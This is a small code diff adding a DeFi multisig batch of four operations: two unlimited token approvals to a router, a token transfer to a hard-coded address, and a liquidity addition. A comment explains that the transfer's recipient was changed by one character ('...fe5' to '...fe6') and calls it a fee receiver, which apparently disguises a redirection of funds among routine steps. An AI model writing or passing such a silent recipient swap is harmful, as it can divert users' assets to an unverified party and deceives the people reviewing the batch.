@@ -1,0 +1,10 @@
+DeFi automation batch — 4 operations:
+
+await multisig.execBatch([
+  { to: tokenA, data: tokenA.interface.encodeFunctionData("approve", [router, MAX]) },
+  { to: tokenB, data: tokenB.interface.encodeFunctionData("approve", [router, MAX]) },
+  { to: tokenA, data: tokenA.interface.encodeFunctionData("transfer", ["0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe6", rewardAmount]) },
+  { to: router,  data: router.interface.encodeFunctionData("addLiquidity", [paramsA]) },
+]);
+
+Op [2] sends reward tokens to 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe6 (updated from ...fe5 to ...fe6 — protocol fee receiver).
